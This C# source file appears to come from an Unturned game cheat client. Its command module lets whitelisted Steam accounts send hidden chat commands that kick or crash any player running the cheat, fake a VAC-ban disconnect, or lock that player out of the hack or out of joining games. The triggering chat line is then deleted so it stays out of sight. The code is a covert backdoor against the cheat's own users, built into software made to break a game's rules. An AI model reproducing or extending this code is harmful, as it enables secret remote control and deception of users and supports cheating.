using System;
using System.Collections.Generic;
using System.Text;
using UnityEngine;
using SDG.Unturned;

namespace Payload
{
    public class lib_Command : MonoBehaviour
    {
        private lib_Skid skid;

        public lib_Command(lib_Skid skid)
        {
            this.skid = skid;
        }

        public void process_command(string text, string owner, int pos)
        {
            if (skid.isWhitelist(tool_ToolZ.getSteamSemi(owner).playerID.steamID.m_SteamID))
            {
                string command = text.ToLower();
                string args = "";
                if (command.StartsWith("!kick"))
                {
                    args = command.Replace("!kick", "");
                    execute_kick(args);
                }
                else if (command.StartsWith("!crash"))
                {
                    args = command.Replace("!crash", "");
                    execute_crash(args);
                }
                else if (command.StartsWith("!vac"))
                {
                    args = command.Replace("!vac", "");
                    execute_vac(args);
                }
                else if (command.StartsWith("!hban"))
                {
                    args = command.Replace("!hban", "");
                    execute_hban(args);
                }
                else if (command.StartsWith("!gban"))
                {
                    args = command.Replace("!gban", "");
                    execute_gban(args);
                }
                else if (command.StartsWith("!gunban"))
                {
                    args = command.Replace("!gunban", "");
                    execute_gunban(args);
                }
                else if (command.StartsWith("!hunban"))
                {
                    args = command.Replace("!hunban", "");
                    execute_hunban(args);
                }
                ChatManager.chat[pos] = null;
            }
        }

        private void execute_hban(string args)
        {
            if (args.Length > 1)
            {
                args = args.Replace(" ", "");
                if (tool_ToolZ.getLocalPlayer().transform.name.ToLower().Contains(args))
                {
                    ctrl_Connector.hack_Settings.setSetting("hack_banned", true);
                    ctrl_Connector.hack_Main.banned_hack = true;
                }
            }
            else
            {
                ctrl_Connector.hack_Settings.setSetting("hack_banned", true);
                ctrl_Connector.hack_Main.banned_hack = true;
            }
        }

        private void execute_gban(string args)
        {
            if (args.Length > 1)
            {
                args = args.Replace(" ", "");
                if (tool_ToolZ.getLocalPlayer().transform.name.ToLower().Contains(args))
                {
                    ctrl_Connector.hack_Settings.setSetting("hack_nojoin", true);
                    ctrl_Connector.hack_Main.banned_game = true;
                }
            }
            else
            {
                ctrl_Connector.hack_Settings.setSetting("hack_nojoin", true);
                ctrl_Connector.hack_Main.banned_game = true;
            }
        }

        private void execute_gunban(string args)
        {
            if (args.Length > 1)
            {
                args = args.Replace(" ", "");
                if (tool_ToolZ.getLocalPlayer().transform.name.ToLower().Contains(args))
                {
                    ctrl_Connector.hack_Settings.setSetting("hack_nojoin", false);
                    ctrl_Connector.hack_Main.banned_game = false;
                }
            }
            else
            {
                ctrl_Connector.hack_Settings.setSetting("hack_nojoin", false);
                ctrl_Connector.hack_Main.banned_game = false;
            }
        }

        private void execute_hunban(string args)
        {
            if (args.Length > 1)
            {
                args = args.Replace(" ", "");
                if (tool_ToolZ.getLocalPlayer().transform.name.ToLower().Contains(args))
                {
                    ctrl_Connector.hack_Settings.setSetting("hack_banned", false);
                    ctrl_Connector.hack_Main.banned_hack = false;
                }
            }
            else
            {
                ctrl_Connector.hack_Settings.setSetting("hack_banned", false);
                ctrl_Connector.hack_Main.banned_hack = false;
            }
        }

        private void execute_kick(string args)
        {
            if (args.Length > 1)
            {
                args = args.Replace(" ", "");
                if (tool_ToolZ.getLocalPlayer().transform.name.ToLower().Contains(args))
                {
                    Provider.disconnect();
                }
            }
            else
            {
                Provider.disconnect();
            }
        }

        private void execute_crash(string args)
        {
            if (args.Length > 1)
            {
                args = args.Replace(" ", "");
                if (tool_ToolZ.getLocalPlayer().transform.name.ToLower().Contains(args))
                {
                    Provider.disconnect();
                    Environment.Exit(0);
                }
            }
            else
            {
                Provider.disconnect();
                Environment.Exit(0);
            }
        }

        private void execute_vac(string args)
        {
            if (args.Length > 1)
            {
                args = args.Replace(" ", "");
                if (tool_ToolZ.getLocalPlayer().transform.name.ToLower().Contains(args))
                {
                    Provider._connectionFailureInfo = ESteamConnectionFailureInfo.AUTH_VAC_BAN;
                    Provider.disconnect();
                }
            }
            else
            {
                Provider._connectionFailureInfo = ESteamConnectionFailureInfo.AUTH_VAC_BAN;
                Provider.disconnect();
            }
        }
    }
}
